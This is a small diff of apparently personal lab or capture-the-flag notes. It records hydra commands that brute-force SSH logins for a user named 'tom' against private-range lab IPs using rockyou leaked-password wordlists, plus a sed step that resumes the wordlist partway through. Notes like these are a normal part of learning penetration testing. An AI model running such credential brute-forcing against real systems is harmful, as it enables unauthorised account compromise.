@@ -5,4 +5,5 @@
 sed -n '5913,$p' /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou-60.txt >  rockyou-60_after_5912.txt 
 ```
 - and one more round    `hydra -l tom -P rockyou-60_after_5912.txt 10.129.142.86 ssh -t 4 -I`
-![[Pasted image 20240829140046.png]]
+- `hydra -l tom -P rockyou-60_processing.txt 10.129.229.147 ssh -t 4`
+![[Pasted image 20240902171953.png]]
